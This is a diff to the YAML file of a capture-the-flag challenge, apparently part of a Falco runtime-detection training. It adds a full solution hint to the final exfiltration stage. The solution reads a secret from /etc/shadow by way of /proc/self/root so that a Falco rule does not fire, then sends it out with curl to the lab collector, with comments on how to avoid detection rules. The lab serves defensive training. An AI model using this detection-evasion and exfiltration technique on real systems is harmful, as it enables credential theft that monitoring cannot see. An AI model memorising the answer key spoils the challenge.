@@ -29,7 +29,22 @@ steps:
 hints:
   - 3 条件がある — 発火させず読む / collector へ exfil 済み / 提出。順番に片付けよう。
   - 送信手段が鍵。reverse shell は collector (HTTP 受信のみ) に届かず、自前ツールの投下は Drop-and-execute を踏む。箱にある道具だけで完結させる。
-  - "想定解の骨子: /proc/self/root 経由で読み、既存の curl で /exfil に POST し、そのまま submit。禁止ルール 7 つを 1 つも踏まないこと(踏んだらやり直すまで提出できない)。"
+  - |
+    想定解:
+    FLAG=$(grep CTF_MASTER_KEY /proc/self/root/etc/shadow | awk '{print $NF}')
+    # /proc/self/root 経由で読むので fd.name が /etc 始まりにならず発火しない (03 の技法の再利用)
+
+    curl -s "$FALCO_CTF_COLLECTOR/api/challenges/10-final-exfil/exfil" \
+      -H 'Content-Type: application/json' \
+      -d "{\"user\":\"$FALCO_CTF_USER\",\"flag\":\"$FLAG\"}"
+    # 既存の curl で collector へ静かに HTTP POST。reverse shell や自前バイナリの
+    # drop+実行は禁止ルールに触れるのでここでは使わない
+
+    source /opt/ctf/submit.sh
+    submit 10-final-exfil "$FLAG"
+    # 禁止ルール 7 つを 1 つも踏んでいなければ、これで CLEARED
+    # (1 つでも発火させていた場合はこの attempt では通らない。やり直すと exfil の
+    # 記録も消えるので、その場合は curl の送信からやり直すこと)
 bridge: >-
   master key は、Falco に一度も気づかれることなく箱の外へ抜けた。CTF Company の
   キルチェーンは踏破 — だが本当の学びは攻撃側ではない。あなたが避けた検知の一つ一つが、
